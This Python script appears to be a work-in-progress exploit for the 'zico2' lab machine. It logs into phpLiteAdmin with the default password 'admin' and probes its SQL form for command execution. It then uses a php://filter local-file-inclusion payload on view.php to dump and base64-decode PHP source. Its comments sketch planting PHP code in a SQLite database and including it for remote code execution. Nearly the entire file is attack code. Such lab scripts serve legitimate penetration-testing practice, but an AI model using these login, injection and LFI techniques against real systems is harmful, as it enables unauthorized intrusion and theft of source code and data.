#!/usr/bin/env python3
"""zico2 RCE - Use phpLiteAdmin SQL to execute commands"""
import requests
import re

s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'
s.timeout = 15
BASE = 'http://192.168.18.132'
PHPLITE = f'{BASE}/dbadmin/test_db.php'

# Login
print('[1] Login...')
s.post(PHPLITE, data={'password': 'admin', 'remember': 'on', 'login': 'Login', 'proc_login': 'true'})

# Try SQL tab - use load_extension or write commands
# First, let's try the SQL view to execute queries
print('[2] Trying SQL execution...')
r = s.get(f'{PHPLITE}?view=sql', timeout=15)
print(f'  SQL view: {r.status_code} ({len(r.text)} bytes)')

# Find the SQL form
from bs4 import BeautifulSoup
soup = BeautifulSoup(r.text, 'lxml')
form = soup.find('textarea', {'name': re.compile(r'sql|query', re.I)})
if form:
    print(f'  Found SQL textarea: name={form.get("name")}')

# Look for all textareas and inputs
for ta in soup.find_all('textarea'):
    print(f'  Textarea: name={ta.get("name")}')
for inp in soup.find_all('input'):
    print(f'  Input: name={inp.get("name")} type={inp.get("type")} value={inp.get("value","")[:50]}')

# Try executing a simple query
print('\n[3] Executing test query...')
r2 = s.post(PHPLITE, data={
    'view': 'sql',
    'query': 'SELECT * FROM info',
    'sql': 'SELECT * FROM info',
}, timeout=15)
print(f'  Result: {r2.status_code} ({len(r2.text)} bytes)')

# Try the correct form action
r3 = s.post(f'{PHPLITE}?view=sql', data={
    'query': 'SELECT * FROM info',
}, timeout=15)
print(f'  Result2: {r3.status_code} ({len(r3.text)} bytes)')

# Look for query results
for txt in ['root', 'zico', '653F4B']:
    if txt in r3.text:
        print(f'  Found {txt} in result!')

# Method: Create a new database with a PHP filename in a web-accessible directory
# phpLiteAdmin allows creating new databases
# The key trick: we need the database to be stored in a web directory
# But the configured directory is /usr/databases/ which is not web accessible

# Alternative: Use LFI to include the database file
# SQLite files start with "SQLite format 3\000"
# If we can trick the LFI into including the SQLite file and it contains our PHP code...

print('\n[4] Alternative: Using LFI to read /var/www/html/view.php source...')
r4 = s.get(f'{BASE}/view.php?page=view.php', timeout=10)
# This might cause infinite loop, so be careful
# Instead, read it via php://filter
r5 = s.get(f'{BASE}/view.php?page=php://filter/convert.base64-encode/resource=view.php', timeout=10)
if 'Hacking' not in r5.text and len(r5.text) > 50:
    import base64
    clean = re.sub(r'<[^>]+>', '', r5.text).strip()
    print(f'  Got base64: {clean[:200]}')
    try:
        decoded = base64.b64decode(clean).decode('utf-8', errors='ignore')
        print(f'  Decoded ({len(decoded)} bytes):')
        print(decoded[:500])
    except:
        print(f'  Raw: {r5.text[:500]}')
else:
    print(f'  LFI failed: {r5.status_code} ({len(r5.text)} bytes)')
    # Check if Hacking attempt message
    if 'Hacking' in r5.text:
        print('  Blocked by WAF')
